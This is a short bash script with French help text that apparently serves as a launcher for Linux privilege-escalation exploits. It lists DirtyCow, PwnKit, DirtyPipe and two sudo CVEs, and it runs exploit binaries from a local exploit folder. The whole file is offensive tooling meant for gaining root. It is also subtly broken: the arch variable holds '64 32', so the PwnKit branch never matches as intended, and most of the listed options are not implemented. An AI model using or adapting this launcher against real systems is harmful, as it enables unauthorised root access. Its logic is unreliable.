#!/bin/bash

arch="64 32"

if [[ "$*" == "-help" ]]; then
    echo "Commande :"
    echo "  -DirtyCow      : Exploite DirtyCow - CVE-2016-5195"
    echo "  -PwnKit64/32   : Exploite PwnKit en architecture 64/32 - CVE-2021-4034"
    echo "  -DirtyPipe     : Exploite DirtyPipe - CVE-2022-0847"
    echo "  -Chroot        : Exploite Sudo Chroot - CVE-2025-32463"
    echo "  -SudoHost      : Exploite Sudo Hostname - CVE-2025-32462 "
    echo "  -check         : Verifie si gcc est installer"
    exit 0
fi

# PwnKit
if [[ "$*" == "-PwnKit${arch}" ]]; then
    "${PWD}/exploit/PwnKit/PwnKit${arch}"    
fi

# Sudo-Host
if [[ "$*" == "-SudoHost" ]]; then
    "${PWD}/exploit/Sudo-host/exploit"
fi
